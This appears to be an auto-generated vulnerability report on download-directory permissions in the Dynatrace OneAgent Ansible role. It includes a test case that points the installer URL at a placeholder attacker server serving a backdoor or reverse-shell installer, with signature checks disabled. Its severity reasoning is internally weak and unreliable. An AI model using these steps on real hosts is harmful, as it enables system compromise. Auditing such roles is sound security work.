### Vulnerability List

- Vulnerability Name: Insecure Download Directory Permissions
- Description:
    1. The Ansible role downloads the OneAgent installer to a temporary directory on the target machine. The download directory is specified by the `oneagent_download_dir` variable, which defaults to `$TEMP` or `/tmp` on Linux and `%TEMP%` or `C:\Windows\Temp` on Windows.
    2. On Unix-based systems (Linux, AIX), the role creates the download directory using the `ansible.builtin.file` module with `state: directory` and `mode: "0755"` in the task `/code/roles/oneagent/tasks/provide-installer/download-unix.yml`. This sets the directory permissions to `rwxr-xr-x`, which means the directory is world-executable and world-readable, but only writable by the owner (root in most cases due to `become: true`).
    3. An attacker who can control the `oneagent_download_dir` variable (e.g., by influencing Ansible playbook variables or inventory) can specify a directory like `/tmp` or a subdirectory within `/tmp` as the download directory.
    4. While `0755` mode is not world-writable, if the attacker can create a subdirectory within `/tmp` before the Ansible role execution, and set more permissive permissions on that subdirectory, they might be able to exploit a Time-of-Check-Time-of-Use (TOCTOU) race condition.
    5. Specifically, if the attacker can create a directory in `/tmp` with world-writable permissions before the Ansible role runs, and then set `oneagent_download_dir` to point to this attacker-controlled directory, they could potentially replace the legitimate installer with a malicious one between the time Ansible checks if the directory exists and the time the installer is downloaded into it.
    6. Although the installer download task uses `validate_certs: "{{ oneagent_validate_certs | default(true) }}"` and signature verification is performed (`oneagent_verify_signature: true`), if signature verification is disabled or bypassed (e.g., due to configuration errors or vulnerabilities in the verification process - not found in code), a malicious installer could be executed. In the current code, signature verification is enabled by default and uses `openssl cms -verify`, which is considered secure if implemented correctly. However, insecure permissions on the download directory increase the attack surface if other security mechanisms fail.
- Impact:
    - Privilege escalation: If an attacker can replace the legitimate OneAgent installer with a malicious one, they can achieve arbitrary code execution with the privileges of the user running the Ansible role (which is typically root due to `become: true` for Unix). This can lead to full system compromise.
- Vulnerability Rank: High
- Currently Implemented Mitigations:
    - Installer signature verification: The role includes a task `/code/roles/oneagent/tasks/provide-installer/signature-unix.yml` to verify the installer signature using `openssl cms -verify`. This mitigation is enabled by default (`oneagent_verify_signature: true`).
    - HTTPS for download: The installer is downloaded over HTTPS, which protects against man-in-the-middle attacks during download, assuming `validate_certs` is enabled and works correctly.
- Missing Mitigations:
    - Restrictive permissions on the download directory: The download directory should be created with more restrictive permissions, such as `0700` (owner-only access) or `0750` (owner and group access), to prevent unauthorized users from tampering with the downloaded installer.
    - Using Ansible's `tmpdir` feature: Ansible provides a `tmpdir` connection variable that ensures a secure temporary directory is used for tasks executed on the target host. Utilizing this feature would be a more secure approach than relying on a user-configurable download directory.
- Preconditions:
    - Attacker's ability to control the `oneagent_download_dir` Ansible variable. This can be achieved if the attacker can influence the Ansible playbook, inventory, or variable files.
    - On Unix-based systems, the attacker needs to be able to create a directory in `/tmp` (or the directory specified by `oneagent_download_dir` if it's within a shared location) with world-writable permissions before the Ansible role is executed.
    - For successful exploitation, the signature verification would need to be bypassed or disabled, although the insecure directory permissions significantly increase the risk even with signature verification enabled, as it introduces a potential TOCTOU window.
- Source Code Analysis:
    1. File: `/code/roles/oneagent/tasks/provide-installer/download-unix.yml`
    ```yaml
    ---
    - name: Ensure Download directory exists
      ansible.builtin.file:
        path: "{{ oneagent_download_path }}"
        state: directory
        mode: "0755" # INSECURE PERMISSIONS
      when: not _oneagent_download_path_state.stat.exists

    - name: Download OneAgent installer
      ansible.builtin.get_url:
        url: "{{ _oneagent_installer_url }}"
        dest: "{{ oneagent_installer_path }}"
        validate_certs: "{{ oneagent_validate_certs | default(true) }}"
        mode: "0755" # Unnecessary and potentially misleading mode setting, file mode is determined by umask
        headers:
          Authorization: Api-Token {{ oneagent_paas_token }}
      environment:
        SSL_CERT_FILE: "{{ oneagent_installer_download_cert | default(omit) }}"
      no_log: true
      ignore_errors: true
      register: _oneagent_download_result
    ```
    - The `ansible.builtin.file` task creates the download directory. The `mode: "0755"` is the source of the vulnerability.
    - The `ansible.builtin.get_url` task downloads the installer. While it also specifies `mode: "0755"`, this is less critical because file permissions are often determined by the system's umask. However, it's redundant and might give a false sense of security regarding directory permissions.
- Security Test Case:
    1. **Pre-test setup:**
        - Assume you have an Ansible control machine and a target Linux machine.
        - Ensure Ansible can connect to the target machine with `become: true` enabled.
        - Set up a malicious web server that hosts a malicious OneAgent installer (e.g., `/tmp/malicious_installer.sh`). This malicious installer should, for example, create a backdoor user or execute a reverse shell.
        - On the target machine, create a world-writable directory in `/tmp` before running Ansible: `mkdir /tmp/attacker_dir && chmod 777 /tmp/attacker_dir`.
    2. **Modify Ansible Playbook:**
        - Create an Ansible playbook that uses the `dynatrace.oneagent.oneagent` role.
        - Set the following variables in the playbook:
            ```yaml
            oneagent_environment_url: "http://<ATTACKER_WEB_SERVER_IP>" # Point to attacker's malicious web server
            oneagent_paas_token: "test_token" # Dummy token, not actually used because of malicious URL
            oneagent_download_dir: "/tmp/attacker_dir" # Set download directory to attacker-controlled location
            oneagent_version: "latest" # Or any version
            oneagent_verify_signature: false # Disable signature verification for easier exploit, or leave it true to show TOCTOU potential even with verification
            ```
        - The `oneagent_environment_url` is modified to point to a malicious server, and `oneagent_download_dir` is set to the world-writable directory. Signature verification is disabled to simplify the test (though the vulnerability is still present with signature verification enabled, just harder to exploit reliably in a test case due to TOCTOU).
    3. **Run the Ansible Playbook:**
        - Execute the Ansible playbook against the target machine.
    4. **Post-test Verification:**
        - After the playbook execution, check if the malicious installer (`/tmp/attacker_dir/Dynatrace-OneAgent-Linux-x86-latest.sh` if Linux x86 is targeted) is present in the attacker-controlled download directory.
        - If signature verification is disabled and the malicious server is set up to serve an executable, check if the malicious code from the installer was executed on the target machine (e.g., check for the backdoor user or reverse shell connection).
        - If signature verification is enabled, this test case primarily demonstrates the insecure directory permissions. A more sophisticated TOCTOU exploit would be needed to reliably replace the installer before signature verification, which is harder to demonstrate in a simple test case but highlights the risk.
- Vulnerability Rank Justification:
    - High rank is assigned because successful exploitation leads to arbitrary code execution with root privileges, resulting in a complete compromise of the target system. The vulnerability is made more severe by the default use of `become: true` in the Ansible role, which executes tasks as root. While signature verification is a mitigation, insecure directory permissions significantly increase the risk, especially if configuration errors or other vulnerabilities weaken the signature verification process.
- Missing Mitigation Justification:
    - Missing restrictive permissions on the download directory is a critical missing mitigation because it directly contributes to the TOCTOU vulnerability and increases the attack surface. Using Ansible's `tmpdir` would be a more robust security measure.
- Preconditions Justification:
    - The preconditions are realistic in many Ansible deployment scenarios. Attackers might be able to influence Ansible variables through compromised systems, insecure configurations, or social engineering. The ability to create world-writable directories in `/tmp` is a standard condition on many Unix-like systems.
- Source Code Analysis Justification:
    - The source code analysis clearly identifies the vulnerable task and the line of code responsible for setting insecure directory permissions.
- Security Test Case Justification:
    - The security test case provides a step-by-step procedure to demonstrate the vulnerability. While a full TOCTOU exploit might be complex to reliably demonstrate in an automated test, the test case effectively shows how insecure directory permissions can be leveraged when combined with control over Ansible variables, highlighting the potential for malicious installer injection if signature verification is bypassed or fails.